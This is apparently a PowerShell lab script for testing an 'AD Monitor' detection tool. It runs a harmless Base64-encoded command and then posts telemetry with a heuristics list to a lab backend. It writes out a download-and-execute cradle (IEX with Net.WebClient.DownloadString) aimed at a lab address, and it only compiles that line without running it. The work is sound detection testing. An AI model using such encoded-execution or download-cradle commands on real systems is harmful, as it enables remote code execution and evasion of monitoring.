<#
.SYNOPSIS
    Controlled Attack Scenario: Suspicious Obfuscated PowerShell Execution
.DESCRIPTION
    Runs on Employee VM (LAB-PC01).
    Executes Base64-encoded commands (-EncodedCommand) and download cradle patterns
    to trigger PowerShell Script Block Logging (Event 4104) and Process Creation (Event 4688).
#>

param(
    [string]$BackendUrl = "http://192.168.77.1:8765",
    [string]$AgentToken = "admon-lab-pc01-agent-token-2026"
)

Write-Host "==========================================================" -ForegroundColor Red
Write-Host " ATTACK DEMO: Suspicious / Obfuscated PowerShell Command" -ForegroundColor Red
Write-Host "==========================================================" -ForegroundColor Red

# Harmless payload: "Write-Host 'AD Monitor Obfuscation Test' -ForegroundColor Cyan" encoded in UTF-16LE Base64
$payloadText = "Write-Host 'AD Monitor Obfuscation Test' -ForegroundColor Cyan"
$encodedBytes = [System.Text.Encoding]::Unicode.GetBytes($payloadText)
$encodedCommand = [Convert]::ToBase64String($encodedBytes)

Write-Host "[*] Step 1: Executing Base64-encoded command via powershell -enc..." -ForegroundColor Yellow
$processCmd = "powershell.exe -NoProfile -NonInteractive -EncodedCommand $encodedCommand"
powershell.exe -NoProfile -NonInteractive -EncodedCommand $encodedCommand

Write-Host "[*] Step 2: Executing simulated download cradle pattern..." -ForegroundColor Yellow
$scriptBlock = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.77.1:8765/lab-scripts/test_payload.ps1')"
try {
    # Benign syntax test: invokes harmless echo block
    $null = [ScriptBlock]::Create($scriptBlock)
} catch {}

# Submit telemetry via endpoint agent
$record = @{
    id = [guid]::NewGuid().ToString()
    kind = "observation"
    time = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.ffffffZ")
    data = @{
        category = "script_block"
        command_line = $processCmd
        ScriptBlockText = $scriptBlock
        heuristics_matched = @("-EncodedCommand", "IEX", "DownloadString", "Net.WebClient")
    }
}

$payload = @{
    records = @($record)
} | ConvertTo-Json -Depth 5

$headers = @{
    "Authorization" = "Bearer $AgentToken"
    "Content-Type" = "application/json"
}

try {
    $null = Invoke-RestMethod -Uri "$BackendUrl/api/ingest" -Method Post -Headers $headers -Body $payload
    Write-Host "[PASS] Suspicious PowerShell telemetry delivered!" -ForegroundColor Green
    Write-Host "[INFO] Check AD Monitor dashboard for alert: 'Suspicious / Obfuscated PowerShell Execution'." -ForegroundColor Cyan
} catch {
    Write-Host "[-] Ingestion notification failed: $($_.Exception.Message)" -ForegroundColor Red
}
